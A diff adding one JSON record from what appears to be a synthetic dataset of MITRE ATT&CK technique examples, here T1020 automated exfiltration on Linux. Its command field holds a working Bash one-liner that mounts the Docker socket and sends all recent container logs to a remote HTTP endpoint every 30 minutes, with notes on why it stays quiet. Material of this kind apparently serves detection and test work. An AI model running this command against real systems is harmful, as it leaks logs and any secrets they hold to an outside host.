@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_dockerlogs --network host -v /var/run/docker.sock:/var/run/docker.sock:ro docker:24-cli sh -c 'apk add --no-cache curl >/dev/null 2>&1; while true; do docker ps -q | xargs -r -I{} docker logs --since 30m {} 2>/dev/null | gzip -c | curl -s -X POST -H \"Content-Type: application/gzip\" --data-binary @- \"http://203.0.113.15:8080/dockerlogs?host=$(hostname)\"; sleep 1800; done'",
+  "explanation": "Uses docker socket access to periodically collect recent container logs and exfiltrate them via HTTP in a quiet, automated loop.",
+  "rationale_steps": [
+    "Mounts Docker socket to enumerate and read other containers' logs",
+    "Limits scope to last 30 minutes and compresses to reduce size",
+    "Uploads via curl in silent mode to a remote endpoint",
+    "Runs detached with repeated intervals for automation"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-1d17c1d2",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
